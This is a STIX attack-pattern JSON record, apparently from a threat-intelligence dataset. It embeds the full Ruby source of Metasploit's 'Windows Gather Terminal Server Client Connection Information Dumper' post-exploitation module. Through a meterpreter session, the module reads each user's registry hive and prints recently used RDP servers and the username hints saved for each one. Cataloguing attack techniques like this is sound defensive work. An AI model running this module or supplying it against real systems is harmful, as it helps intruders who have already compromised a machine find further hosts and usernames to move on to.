{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--827e929a-c48d-4e3e-9f1d-91c94f62137d",
    "created": "2024-08-14T16:33:05.050788Z",
    "modified": "2024-08-14T16:33:05.050792Z",
    "name": "Windows Gather Terminal Server Client Connection Information Dumper",
    "description": " This module dumps MRU and connection data for RDP sessions  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_termserv.rb",
            "external_id": "enum_termserv.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Terminal Server Client Connection Information Dumper',\n        'Description' => %q{\n          This module dumps MRU and connection data for RDP sessions\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'mubix' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      print_status(\"Doing enumeration for #{hive['SID']}\")\n      root_key, base_key = session.sys.registry.splitkey(\"#{hive['HKU']}\\\\Software\\\\Microsoft\\\\Terminal\\ Server\\ Client\")\n      begin\n        tmpkey = session.sys.registry.open_key(root_key, base_key, KEY_READ)\n        tmpkey_values = tmpkey.enum_key\n        if tmpkey_values.include?('Default')\n          defaultkey = session.sys.registry.open_key(root_key, base_key + '\\\\Default', KEY_READ)\n          print_good('Systems connected to:')\n          defaultkey.enum_value.each do |x|\n            if x.name =~ /^MRU/\n              print_good(\"--> #{defaultkey.query_value(x.name).data}\")\n            end\n          end\n        end\n\n        if tmpkey_values.include?('Servers')\n          serverskey = session.sys.registry.open_key(root_key, base_key + '\\\\Servers', KEY_READ)\n          serverskey_keys = serverskey.enum_key\n          print_good('Server list and user hints:')\n          serverskey_keys.each do |hostval|\n            hostvalkey = session.sys.registry.open_key(root_key, base_key + '\\\\Servers\\\\' + hostval, KEY_READ)\n            print_good(\"#{hostval} is connected to as #{hostvalkey.query_value('UsernameHint').data}\")\n          end\n        end\n      rescue Rex::Post::Meterpreter::RequestError => e\n      end\n    end\n    unload_our_hives(userhives)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}